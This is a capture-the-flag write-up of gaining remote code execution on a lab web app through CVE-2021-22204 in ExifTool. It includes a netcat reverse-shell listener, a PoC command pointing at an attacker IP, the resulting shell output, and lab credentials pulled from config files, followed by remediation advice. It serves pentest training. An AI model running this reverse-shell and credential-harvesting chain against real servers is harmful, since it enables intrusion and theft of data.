# CTF Write-Up: ExifViewer — CVE-2021-22204 RCE

**Author:** Neelesh Pandey  
**Platform:** Hackviser  
**Target:** `exifviewer.hv`  
**Category:** Web Application / Remote Code Execution  
**Difficulty:** Medium  
**CVE:** [CVE-2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)  

---

## Objective

Identify and exploit vulnerabilities in the ExifViewer web application to gain remote access and extract sensitive information from the server.

---

## Methodology

```
Reconnaissance → Vulnerability ID → Payload Generation → 
Upload & Trigger → Reverse Shell → Post-Exploitation → Data Extraction
```

---

## 1. Reconnaissance

### Directory Enumeration

```bash
gobuster dir -u http://exifviewer.hv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**

```
/assets     → 403 Forbidden
/index.php  → 200 OK
```

### Application Fingerprinting

Manual interaction with the application revealed:

- **Image upload feature** present on the main page
- Server processes uploaded image metadata after upload
- Backend identified as using **ExifTool version 12.23**

> ExifTool 12.23 is publicly known to be vulnerable to **CVE-2021-22204** — a critical RCE via malicious DjVu metadata embedded in image files.

---

## 2. Vulnerability Identification

| Detail | Value |
|--------|-------|
| Component | ExifTool |
| Version | 12.23 |
| CVE | CVE-2021-22204 |
| Type | Remote Code Execution (RCE) |
| CVSS Score | 7.8 (High) |
| Attack Vector | Malicious image metadata processed server-side |

**How it works:**  
ExifTool versions before 12.24 fail to safely handle DjVu annotation metadata. A specially crafted image file can embed shell commands in the metadata that get executed when ExifTool processes the file — in this case, triggered by the upload feature.

---

## 3. Exploitation

### 3.1 Payload Generation

Generated a malicious JPEG with a reverse shell payload embedded in the image metadata using a public PoC exploit for CVE-2021-22204:

```bash
# Set up listener first
nc -lvnp 4444

# Generate malicious image with embedded reverse shell
python3 exploit.py -ip <attacker-ip> -port 4444
```

### 3.2 Upload & Trigger

1. Uploaded the malicious image via the web application's upload form
2. Application passed the file to ExifTool for metadata processing
3. ExifTool executed the embedded payload on the server

### 3.3 Reverse Shell Received

```bash
listening on [any] 4444 ...
connect to [attacker-ip] from exifviewer.hv
$ whoami
www-data
```

> Shell obtained as `www-data` — the web server process user.

---

## 4. Post-Exploitation

### 4.1 File System Enumeration

Navigated to the upload directory:

```bash
cd /var/www/93c0550a5543b366_uploads
ls -la
```

**Files discovered:**

```
users.csv
database.go
Ja23s6_techinnovations_invoice.pdf
```

### 4.2 Credential Extraction

Read `users.csv`:

```bash
cat users.csv
```

**Credentials found:**

| Field | Value |
|-------|-------|
| Email | salvarado@waltersltd.hv |
| Password | hGCQjxZs5chK |

### 4.3 Database Configuration

Extracted database connection string from `database.go`:

```bash
cat database.go
```

**Connection string:**

```
postgres://postgres:JS3CqjNCcn7Ve@olympusbytes.hv:5432/olympus
```

| Field | Value |
|-------|-------|
| DB Host | olympusbytes.hv |
| Port | 5432 |
| Username | postgres |
| Password | JS3CqjNCcn7Ve |
| Database | olympus |

### 4.4 Invoice Analysis

Downloaded and analysed `Ja23s6_techinnovations_invoice.pdf` — extracted invoice number and transaction details from PDF content.

---

## 5. Flags Summary

| Finding | Value |
|---------|-------|
| RCE achieved via | CVE-2021-22204 (ExifTool 12.23) |
| Shell user | www-data |
| Extracted email | salvarado@waltersltd.hv |
| Extracted password | hGCQjxZs5chK |
| DB host | olympusbytes.hv:5432 |
| DB credentials | postgres / JS3CqjNCcn7Ve |

---

## 6. Tools Used

| Tool | Purpose |
|------|---------|
| `gobuster` | Directory enumeration |
| `CVE-2021-22204 PoC` | Malicious image payload generation |
| `netcat (nc)` | Reverse shell listener |
| `cat / ls` | File system enumeration |

---

## 7. Key Takeaways

- **Unpatched software is critical risk** — ExifTool 12.23 was publicly known to be vulnerable at the time. A simple version update to 12.24+ would have prevented this entire attack chain
- **File upload features are high-value targets** — any functionality that processes uploaded files server-side must validate file type, content, and never pass untrusted input to external tools without sanitisation
- **Source code and config files in web-accessible directories** (`database.go`, `users.csv`) expose credentials directly — these should never be stored in the web root
- **CVE research is a core pentesting skill** — identifying the exact software version and matching it to a known CVE is often faster than finding a zero-day

---

## 8. Remediation Recommendations

| Finding | Risk | Fix |
|---------|------|-----|
| ExifTool 12.23 | Critical | Update to ExifTool 12.24 or later immediately |
| Credentials in web root | Critical | Move sensitive files outside the web root; use environment variables for DB credentials |
| Unrestricted file upload | High | Validate file type server-side; strip metadata before processing; sandbox ExifTool execution |
| www-data access to sensitive files | High | Apply principle of least privilege; web process should not have read access to config files |

---

## References

- [CVE-2021-22204 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)
- [ExifTool Changelog](https://exiftool.org/history.html)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
